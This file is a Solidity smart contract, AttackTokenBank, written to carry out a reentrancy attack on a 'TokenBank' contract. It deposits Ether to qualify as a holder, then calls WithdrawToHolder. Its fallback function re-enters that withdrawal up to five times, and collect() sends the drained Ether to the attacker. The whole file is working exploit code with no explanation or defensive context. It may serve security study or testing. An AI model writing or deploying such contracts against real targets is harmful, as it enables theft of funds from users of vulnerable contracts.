pragma solidity ^0.4.19;

interface ITokenBank {
    function WithdrawToHolder(address _addr, uint _wei) external payable;
    function Deposit() external payable;
}

contract AttackTokenBank {
    ITokenBank public vulnerable;
    address public owner;
    uint public reentryCount;

    constructor(address _vulnerable) public {
        vulnerable = ITokenBank(_vulnerable);
        owner = msg.sender;
    }

    // Deposit enough Ether to be a "Holder"
    function attackDeposit() public payable {
        require(msg.value >= 1 ether);
        vulnerable.Deposit.value(msg.value)();
    }

    // Begin reentrancy attack
    function startAttack(uint _amount) public {
        vulnerable.WithdrawToHolder(address(this), _amount);
    }

    // Reentrant fallback
    function () public payable {
        if (reentryCount < 5) {
            reentryCount++;
            vulnerable.WithdrawToHolder(address(this), 1 ether);
        }
    }

    function collect() public {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }
}

